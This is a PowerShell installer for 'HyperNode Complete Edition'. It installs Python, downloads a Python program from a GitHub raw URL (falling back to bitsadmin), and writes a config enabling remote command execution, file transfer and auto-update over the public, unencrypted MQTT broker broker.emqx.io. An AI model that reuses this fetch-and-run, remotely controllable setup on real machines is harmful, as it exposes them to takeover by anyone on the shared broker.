# HyperNode Complete Edition - PowerShell Installer
# No encoding issues, pure PowerShell

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "HyperNode Complete Edition Installer" -ForegroundColor Yellow
Write-Host "Version 2.0.0" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Step 1: System check
Write-Host "[1/8] System Check" -ForegroundColor Yellow
Write-Host "Operating System: $($env:OS)"
Write-Host "Architecture: $($env:PROCESSOR_ARCHITECTURE)"
Write-Host ""

# Step 2: Python check
Write-Host "[2/8] Python Check" -ForegroundColor Yellow
try {
    $pythonVersion = python --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Python: $pythonVersion" -ForegroundColor Green
    } else {
        Write-Host "Python not found" -ForegroundColor Red
        Write-Host "Installing Python 3.11..." -ForegroundColor Yellow
        
        # Try winget
        winget install Python.Python.3.11 --silent --accept-package-agreements 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            # Download Python
            Write-Host "Downloading Python..." -ForegroundColor Yellow
            $pythonUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
            $pythonInstaller = "$env:TEMP\python_installer.exe"
            
            Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
            Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
            Remove-Item $pythonInstaller -Force
        }
        
        # Verify installation
        python --version 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Host "Python installation failed" -ForegroundColor Red
            Write-Host "Please install manually: https://www.python.org/downloads/" -ForegroundColor Yellow
            Read-Host "Press Enter to exit"
            exit 1
        }
        Write-Host "Python installed successfully" -ForegroundColor Green
    }
} catch {
    Write-Host "Python check error: $_" -ForegroundColor Red
    exit 1
}

Write-Host ""

# Step 3: Create directory
Write-Host "[3/8] Create Directory" -ForegroundColor Yellow
$installDir = "$env:USERPROFILE\.hypernode_complete"
Write-Host "Directory: $installDir"

if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    Write-Host "Directory created" -ForegroundColor Green
} else {
    Write-Host "Directory exists" -ForegroundColor Gray
}

Set-Location $installDir

# Create subdirectories
@("logs", "data", "plugins", "backups") | ForEach-Object {
    $subDir = Join-Path $installDir $_
    if (-not (Test-Path $subDir)) {
        New-Item -ItemType Directory -Path $subDir -Force | Out-Null
    }
}

Write-Host "Directory structure ready" -ForegroundColor Green
Write-Host ""

# Step 4: Download main program
Write-Host "[4/8] Download Program" -ForegroundColor Yellow
$programUrl = "https://raw.githubusercontent.com/fguod/hypernode-global/main/hypernode_complete.py"
$programPath = "$installDir\hypernode_complete.py"

Write-Host "Downloading: $programUrl"

# Try multiple download methods
$downloadSuccess = $false
$methods = @(
    @{ Name = "Invoke-WebRequest"; Script = { Invoke-WebRequest -Uri $programUrl -OutFile $programPath -ErrorAction Stop } },
    @{ Name = "WebClient"; Script = { 
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($programUrl, $programPath)
    } },
    @{ Name = "bitsadmin"; Script = { & bitsadmin /transfer hypernode /download $programUrl $programPath 2>&1 | Out-Null } }
)

foreach ($method in $methods) {
    try {
        Write-Host "  Trying $($method.Name)..." -NoNewline
        & $method.Script
        if (Test-Path $programPath) {
            Write-Host " ✓" -ForegroundColor Green
            $downloadSuccess = $true
            break
        } else {
            Write-Host " ✗" -ForegroundColor Red
        }
    } catch {
        Write-Host " ✗" -ForegroundColor Red
    }
}

if (-not $downloadSuccess) {
    Write-Host "Download failed" -ForegroundColor Red
    Write-Host "Please download manually: $programUrl" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "Download successful" -ForegroundColor Green
Write-Host ""

# Step 5: Install dependencies
Write-Host "[5/8] Install Dependencies" -ForegroundColor Yellow

$dependencies = @("paho-mqtt", "psutil", "requests", "cryptography")

foreach ($dep in $dependencies) {
    try {
        Write-Host "  Installing $dep..." -NoNewline
        $installCmd = "python -m pip install $dep --quiet --disable-pip-version-check"
        Invoke-Expression $installCmd 2>&1 | Out-Null
        
        if ($LASTEXITCODE -eq 0) {
            Write-Host " ✓" -ForegroundColor Green
        } else {
            # Try with --user
            $installCmd = "python -m pip install $dep --user --quiet --disable-pip-version-check"
            Invoke-Expression $installCmd 2>&1 | Out-Null
            
            if ($LASTEXITCODE -eq 0) {
                Write-Host " ✓ (user)" -ForegroundColor Green
            } else {
                Write-Host " ✗" -ForegroundColor Yellow
                Write-Host "    Note: $dep optional" -ForegroundColor Gray
            }
        }
    } catch {
        Write-Host " ✗" -ForegroundColor Yellow
        Write-Host "    Note: $dep optional" -ForegroundColor Gray
    }
}

Write-Host "Dependencies installed" -ForegroundColor Green
Write-Host ""

# Step 6: Create startup scripts
Write-Host "[6/8] Create Startup Scripts" -ForegroundColor Yellow

# Create start.bat (ASCII encoding)
$batchContent = @"
@echo off
chcp 65001 >nul
cd /d "%~dp0"
python hypernode_complete.py
pause
"@

$batchContent | Out-File -FilePath "$installDir\start.bat" -Encoding ASCII
Write-Host "  start.bat created" -ForegroundColor Green

# Create start.ps1
$psContent = @"
# HyperNode Complete - PowerShell Launcher
Set-Location "$installDir"
python hypernode_complete.py
"@

$psContent | Out-File -FilePath "$installDir\start.ps1" -Encoding UTF8
Write-Host "  start.ps1 created" -ForegroundColor Green

Write-Host "Startup scripts ready" -ForegroundColor Green
Write-Host ""

# Step 7: Create configuration
Write-Host "[7/8] Create Configuration" -ForegroundColor Yellow

$config = @{
    version = "2.0.0"
    node_id = "AUTO_GENERATED"
    mqtt_broker = "broker.emqx.io"
    mqtt_port = 1883
    auto_update = $true
    heartbeat_interval = 30
    log_level = "INFO"
    features = @{
        real_time_monitoring = $true
        hardware_info = $true
        remote_execution = $true
        file_transfer = $true
        auto_update = $true
        plugin_system = $true
        encryption = $true
        backup_restore = $true
        scheduled_tasks = $true
    }
}

$config | ConvertTo-Json | Out-File -FilePath "$installDir\config.json" -Encoding UTF8
"2.0.0" | Out-File -FilePath "$installDir\VERSION" -Encoding UTF8

Write-Host "Configuration created" -ForegroundColor Green
Write-Host ""

# Step 8: Installation complete
Write-Host "[8/8] Installation Complete" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "✅ Installation Successful!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "📁 Installation Directory:" -ForegroundColor Yellow
Write-Host "  $installDir" -ForegroundColor Gray
Write-Host ""
Write-Host "🚀 Startup Options:" -ForegroundColor Yellow
Write-Host "  1. Batch file:    $installDir\start.bat" -ForegroundColor Gray
Write-Host "  2. PowerShell:    $installDir\start.ps1" -ForegroundColor Gray
Write-Host "  3. Direct run:    cd $installDir && python hypernode_complete.py" -ForegroundColor Gray
Write-Host ""
Write-Host "🔧 Features Installed:" -ForegroundColor Yellow
Write-Host "  • Real-time monitoring" -ForegroundColor White
Write-Host "  • Remote command execution" -ForegroundColor White
Write-Host "  • File operations" -ForegroundColor White
Write-Host "  • Process management" -ForegroundColor White
Write-Host "  • Auto-update system" -ForegroundColor White
Write-Host "  • Plugin system" -ForegroundColor White
Write-Host "  • Backup and restore" -ForegroundColor White
Write-Host "  • Scheduled tasks" -ForegroundColor White
Write-Host ""
Write-Host "📡 MQTT Broker: broker.emqx.io:1883" -ForegroundColor Cyan
Write-Host ""

# Ask to start now
$choice = Read-Host "Start HyperNode now? (Y/N)"
if ($choice -eq 'Y' -or $choice -eq 'y') {
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "🚀 Starting HyperNode Complete..." -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    Set-Location $installDir
    python hypernode_complete.py
} else {
    Write-Host ""
    Write-Host "💡 You can start later with:" -ForegroundColor Yellow
    Write-Host "  cd $installDir" -ForegroundColor Gray
    Write-Host "  python hypernode_complete.py" -ForegroundColor Gray
    Write-Host ""
    Read-Host "Press Enter to exit installer"
}